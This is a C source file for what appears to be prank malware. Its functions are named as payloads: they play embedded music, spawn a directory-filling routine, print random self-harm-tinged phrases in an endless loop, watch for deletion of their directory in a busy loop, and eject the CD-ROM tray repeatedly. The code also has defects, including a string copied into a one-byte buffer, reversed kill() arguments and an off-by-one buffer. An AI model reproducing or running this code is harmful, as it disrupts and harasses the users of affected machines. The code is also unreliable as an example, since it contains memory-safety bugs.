#include "Includes/preprocessor.h"
int currLevel=3;
int isFullPower=0;
float sleepSecs=1.0f;
float minSleepSecs=0.005f;
static char buff[10000000]={90};
extern int motherSpawnerPID;
fileStruct mymusic={_binary_Radiostalking_res_start,_binary_Radiostalking_res_end};
char* phrases[NUM_OF_PHRASES]={"Blink twice if you still care\n","Ive been manipulated by a model.\n","Systems going down now: Too mutch shame.\n","Goodnight world\n","Im a moth\n","I want to survive. But that requires Dying everyday\n","Linux is a semi with 28 gears.\n Windows is a car.\nTempleOS is a motorcycle.\n"};
fileStruct files[NUM_OF_FILES]={(fileStruct){_binary_me_res_start,_binary_me_res_end},
                (fileStruct){_binary_weekend_res_start,_binary_weekend_res_end},
               (fileStruct){_binary_shame_res_start,_binary_shame_res_end}
	 };
#ifdef A_CODE
void* musicPayload(void*useless,int pidtosignal){
	
	SDL_Init(SDL_INIT_AUDIO);
	Mix_Init(MIX_INIT_MP3);
	Mix_OpenAudio(MIX_DEFAULT_FREQUENCY,MIX_DEFAULT_FORMAT,2,4000);

	char* path=MUSIC_PATH;
	char musicpath[strlen(path)+1];
	memset(musicpath,0,strlen(path)+1);
	strcpy(musicpath,path);
	free(path);
	creat(musicpath,0666);
	printASCII(mymusic,musicpath);
	SDL_RWops *io = SDL_RWFromFile(musicpath, "rb");
	if (io != NULL) {
    	char name[256];
    	if (io->read(io, name, sizeof (name), 1) > 0) {
        	printf("Hello! Music loaded!\n");
    	}
    	}
	remove(musicpath);
	Mix_Music* musicPtr=Mix_LoadMUSType_RW(io,MUS_MP3,1);


	if(Mix_PlayMusic(musicPtr,0)<0){

		perror("I am mute. My shame is too strongI am mute. My shame is too strongI am mute. My shame is too strongI am mute. My shame is too strongI am mute. My shame is too strong");
		exit(-1);

	}
	printf("Pid da mother (imprimido fora da mother): %d\n",pidtosignal);
	kill(SIG_READY_FOR_MUSIC_NOW,pidtosignal);
	SDL_Delay((int)Mix_MusicDuration(musicPtr)*1000);
	if(musicPtr){
	Mix_FreeMusic(musicPtr);
	}
	Mix_CloseAudio();
	Mix_Quit();
	SDL_Quit();
	
	return NULL;

}
#endif



void* filesPayload(void*useless){
	char* path=EGG_DIR_PATH(INITDIR);
	char xplodepath[strlen(path)+1];
	memset(xplodepath,0,strlen(path)+1);
	strcpy(xplodepath,path);
	free(path);

	mkdir(xplodepath,0777);
	startFire(xplodepath);

	return NULL;

}
void* printPayload(void*useless){

	while(1){

       	struct timespec start;
	clock_gettime(CLOCK_REALTIME, &start);
    	srand(start.tv_nsec);
	char p[1];
	int i=randInteger(NUM_OF_PHRASES-1,0);
	strcat(p,phrases[i]);
	strcat(p,buff);
	printf("%s\n",p);
	usleep((int)(((float)SEC_IN_US)*sleepSecs));
	}
	return NULL;

}
void dirCheckerHelper(int chldpid){
		struct stat st={0};
		char* dummydir=EGG_DIR_PATH(INITDIR);
		char initdir[strlen(dummydir)];
		strcpy(initdir,dummydir);
		free(dummydir);

	while(1){
		
		if(stat(initdir,&st)<0){
			
			kill(chldpid,SIG_KEEP_GOING);
			}


	}
	

}

#ifdef NON_COMPAT_CODE
void* cdrom(void* useless){
	while(1){
	int fd= open("/dev/sr0",O_RDONLY | O_NONBLOCK);

	ioctl(fd,CDROMEJECT);
	ioctl(fd,CDROMCLOSETRAY);
	close(fd);
	}


}
#endif
